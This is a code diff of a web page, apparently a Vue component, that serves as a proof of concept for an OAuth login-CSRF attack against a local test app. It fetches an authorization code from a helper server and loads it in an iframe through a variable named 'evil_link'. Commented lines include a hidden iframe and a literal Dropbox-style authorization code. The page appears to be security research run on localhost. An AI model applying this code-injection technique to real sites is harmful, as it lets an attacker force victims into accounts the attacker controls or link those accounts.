@@ -10,8 +10,8 @@
           </iframe> -->
   
           <!-- <iframe src="http://localhost:8080/login?code=4a0622b77c02948efe30&amp;login_method=githubLoginSF" style="width:100%;"> -->
-          <!-- <iframe src="http://localhost:8080/login?code=e8af4442c23a9d8a92a6&amp;login_method=githubLoginSF" style="width:100%;" hidden> -->
-          <iframe :src='evil_link' style="width:100%;">
+          <!-- <iframe src="http://localhost:8080/login?code=e8af4442c23a9d8a92a6&amp;login_method=githubLoginSF" style="width:100%;"> -->
+          <iframe :src=evil_link style="width:100%;">
           </iframe>
       <div>
     </div>
@@ -47,11 +47,11 @@
           const resData = await axios.get('http://localhost:8001/oauthcode/get_code');
           console.log(resData)
           if (resData.status === 200) {
-              const code = resData.data;
-              console.log(code)
-              // evil_link.value = `http://localhost:8080/login?state=state&code=${code}&login_method=twitterLoginSF`
-          evil_link.value = `http://localhost:8080/login?state=state&code=${code}&login_method=twitterLoginSF`
-                      console.log(evil_link.value)
+            const code = resData.data;
+            console.log(code)
+            // evil_link.value = `http://localhost:8080/login?state=state&code=${code}&login_method=twitterLoginSF`
+            // evil_link.value = `http://localhost:8080/login?code=bSRDN66vg_AAAAAAAAAAGv5rDwZrdEEFtlp5IhmjQRc&login_method=DropboxSF`
+            evil_link.value = `http://localhost:8080/login?state=state&code=${code}&login_method=twitterLoginSF`
           } else {
             alert('Unknown Error Occurs');
           }
